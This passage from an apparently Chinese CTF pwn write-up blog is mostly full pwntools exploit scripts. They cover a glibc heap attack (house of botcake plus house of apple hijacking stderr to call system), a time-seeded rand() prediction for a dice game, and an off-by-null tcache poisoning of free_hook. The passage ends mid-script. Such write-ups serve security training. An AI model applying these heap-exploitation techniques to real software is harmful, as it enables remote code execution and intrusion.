sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span><span class="token string">b'TLNTQpRgMrjK'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x68</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x430</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x68</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
key<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
heap<span class="token operator">=</span>key<span class="token operator">&lt;&lt;</span><span class="token number">12</span>
show<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">0x21ace0</span>
stderr<span class="token operator">=</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stderr_'</span><span class="token punctuation">]</span>
leak_info<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
leak_info<span class="token punctuation">(</span><span class="token string">'stderr'</span><span class="token punctuation">,</span>stderr<span class="token punctuation">)</span>
leak_info<span class="token punctuation">(</span><span class="token string">'heap_base'</span><span class="token punctuation">,</span>heap<span class="token punctuation">)</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x68</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x430</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
<span class="token comment">#劫持tcache到stderr</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>index<span class="token operator">=</span>i<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x100</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>index<span class="token operator">=</span>i<span class="token punctuation">)</span>
<span class="token comment">#----------------------------------------</span>
<span class="token comment">#house of botcake</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span>

delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token comment">#向前合并，unsortbin</span>

add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x100</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span><span class="token comment">#原来的chunk6</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token comment">#进入tcache</span>

add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0xf0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span><span class="token comment">#切割unsortbin</span>


add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0xf0</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>heap<span class="token operator">+</span><span class="token number">0x1060</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">12</span><span class="token punctuation">)</span><span class="token operator">^</span>stderr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#继续切割unsortbin，修改chunk8的fd，指向stderr</span>
<span class="token comment"># debug()</span>

<span class="token comment">#----------------------------------------</span>
<span class="token comment">#house of apple</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">13</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x100</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'ccc'</span><span class="token punctuation">)</span>
chunka_addr <span class="token operator">=</span> heap<span class="token operator">+</span><span class="token number">0x1280</span>
chunkb_addr <span class="token operator">=</span> heap<span class="token operator">+</span><span class="token number">0x13a0</span>

chunka<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># _wide_data -> _IO_write_base = 0</span>
chunka<span class="token operator">=</span>chunka<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># _wide_data -> _IO_buf_base</span>
chunka<span class="token operator">=</span>chunka<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xe0</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>chunkb_addr<span class="token punctuation">)</span> <span class="token comment">#_wide_data->_wide_vtable = chunk B</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">14</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x110</span><span class="token punctuation">,</span>content<span class="token operator">=</span>chunka<span class="token punctuation">)</span><span class="token comment">#chunka</span>

chunkb<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#_wide_vtable->doallocate=system</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x110</span><span class="token punctuation">,</span>content<span class="token operator">=</span>chunkb<span class="token punctuation">)</span><span class="token comment">#chunkb</span>

fake_io_addr <span class="token operator">=</span> stderr
fake_io <span class="token operator">=</span><span class="token string">b'  sh'</span>
fake_io <span class="token operator">=</span> fake_io<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment"># fp->_IO_write_ptr > _IO_write_base</span>
fake_io <span class="token operator">=</span> fake_io<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#IO_write_base</span>
fake_io <span class="token operator">=</span> fake_io<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>chunka_addr<span class="token punctuation">)</span><span class="token comment">#fp->_wide_data=chunka</span>
fake_io <span class="token operator">=</span> fake_io<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xd8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_wfile_jumps'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#vtabel=_IO_wfile_jumps</span>
leak_info<span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span>key<span class="token punctuation">)</span>


add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x100</span><span class="token punctuation">,</span>content<span class="token operator">=</span>fake_io<span class="token punctuation">)</span>
<span class="token comment">#exit触发</span>
<span class="token comment"># debug('bcall exit')</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># pause()</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="29-qctf-2018-dice-game（伪随机数利用）"><a href="#29-qctf-2018-dice-game（伪随机数利用）" class="headerlink" title="29.qctf_2018_dice_game（伪随机数利用）"></a>29.qctf_2018_dice_game（伪随机数利用）</h2><p>连续猜对50次给flag，用到了<code>seed=time(0),srand(seed),rand()</code>，我们知道，C语言的rand是伪随机数，只要按照程序的规则来做rand，就可以得到一样的伪随机数来匹配了，很简单，但是之前没记录，记录一下。</p>
<p>可以看到程序很简答，没有栈溢出，但会进行50次的随机数判断，如果每次我们都输入的一样就会给出flag。</p>
<p><img src="/images/QQ_1725937321813.png" alt="img"></p>
<p><img src="/images/QQ_1725937795980.png" alt="img"></p>
<p>只要我们再exp中也使用一样的seed，我们就可以获得正确的rand的随机数，具体实现，通过一个库实现：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll
lib<span class="token operator">=</span>cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"libc.so.6"</span><span class="token punctuation">)</span>  
seed<span class="token operator">=</span>lib<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
lib<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>seed<span class="token punctuation">)</span>
gusess <span class="token operator">=</span> lib<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这样就可以在python脚本中使用C语言的函数了。给出exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">0</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc
<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27705</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
lib<span class="token operator">=</span>cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"libc.so.6"</span><span class="token punctuation">)</span>  
seed<span class="token operator">=</span>lib<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
lib<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>seed<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'name: '</span><span class="token punctuation">,</span><span class="token string">b'aaa'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    gusess <span class="token operator">=</span> lib<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">1</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'point(1~6): '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>gusess<span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="30-BUU-x-nuca-2018-offbyone2（off-by-none，double-free）"><a href="#30-BUU-x-nuca-2018-offbyone2（off-by-none，double-free）" class="headerlink" title="30.BUU x_nuca_2018_offbyone2（off by none，double free）"></a>30.BUU x_nuca_2018_offbyone2（off by none，double free）</h2><p>简单题，很经典的off by none利用，2.27，没有edit，有add，delete，show，没有uaf，比较常规</p>
<p>add几乎没限制，有一个自己实现的read</p>
<p><img src="/images/image-20240910191056905.png" alt="image-20240910191056905"></p>
<p>存在off by one</p>
<p><img src="/images/image-20240910185714987.png" alt="image-20240910185714987"></p>
<p>delete，正常清空无法uaf</p>
<p><img src="/images/image-20240910191628662.png" alt="image-20240910191628662"></p>
<p>首先泄露libc，off by none 可以构造一个重叠指针，用这个重叠指针来泄露libc：</p>
<p><img src="/images/image-20240910192133617.png" alt="image-20240910192133617"></p>
<p>先构造好off by none结构，即0,1,2，因为没有edit，先delete一次chunk1再申请回来，造成off by none，造成chunk向前合并后一起进入unsortedbin，切割合适的大小，让unsortedbin的main_area落在chunk1的数据段，泄露即可得到libc。</p>
<p><img src="/images/image-20240910193158798.png" alt="image-20240910193158798"></p>
<p>将残留unsortedbin申请回来，再次构造off by none，让chunk5在完成off by none后进入tcache同样的切割，不过这次切割时切割再大一点，修改chunk5的fd，指向free_hook，这样就让free_hook入链了，因为是2.27，所以没有tcache数量检查，申请出free_hook，打system</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">0</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26726</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

choice_words <span class="token operator">=</span> <span class="token string">'>> '</span>

menu_add <span class="token operator">=</span> <span class="token number">1</span>
add_index_words <span class="token operator">=</span> <span class="token string">''</span>
add_size_words <span class="token operator">=</span> <span class="token string">'length: '</span>
add_content_words <span class="token operator">=</span> <span class="token string">'note:'</span>

menu_del <span class="token operator">=</span> <span class="token number">2</span>
del_index_words <span class="token operator">=</span> <span class="token string">'index: '</span>

menu_show <span class="token operator">=</span> <span class="token number">3</span>
show_index_words <span class="token operator">=</span> <span class="token string">'index: '</span>

menu_edit <span class="token operator">=</span> <span class="token number">44</span>
edit_index_words <span class="token operator">=</span> <span class="token string">'Idx: '</span>
edit_size_words <span class="token operator">=</span> <span class="token string">''</span>
edit_content_words <span class="token operator">=</span> <span class="token string">''</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_add<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>add_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_del<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> del_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>del_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_show<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> show_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>show_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_edit<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>edit_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
<span class="token comment"># debug()</span>

add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x4f0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a\n'</span><span class="token punctuation">)</span><span class="token comment">#0</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0xa8</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a\n'</span><span class="token punctuation">)</span><span class="token comment">#1</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x4f0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'b\n'</span><span class="token punctuation">)</span><span class="token comment">#2</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0xa8</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'aaa\n'</span><span class="token punctuation">)</span><span class="token comment">#3</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0xa8</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xa0</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x5b0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x4f0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a\n'</span><span class="token punctuation">)</span><span class="token comment">#</span>
show<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
